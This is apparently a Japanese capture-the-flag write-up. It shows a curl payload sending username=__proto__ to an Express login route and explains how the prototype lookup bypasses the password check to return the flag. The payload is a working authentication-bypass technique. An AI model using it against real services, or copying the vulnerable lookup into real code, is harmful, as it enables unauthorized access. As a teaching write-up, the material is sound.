ペイロードは以下。

```bash
$ curl -X POST http://34.170.146.252:49712/ \
-d "username=__proto__"
```

このコマンドを実行した場合、`req.body`は以下のようになる。

```javascript
{
  username: "__proto__"
}
```

これを用いて、以下のコードが実行される。

```javascript
app.post("/", (req, res) => {
  const { username, password } = req.body;
  const user = users[username];
  if (!user || user.password !== password) {
    return res.send("invalid credentials");
  }

  res.send(FLAG);
});
```

変数`username`は`__proto__`となり、変数`password`は`undefined`となる。

`users[username]`は`users["__proto__"]`となり、`Object.prototype`を参照することになる。これで`!user`は`false`となる。

二つ目の条件式では、`user.password`と`password`がともに`undefined`となるため、`false`となる。

よって、条件式全体は`false`となり、`res.send(FLAG)`が実行される。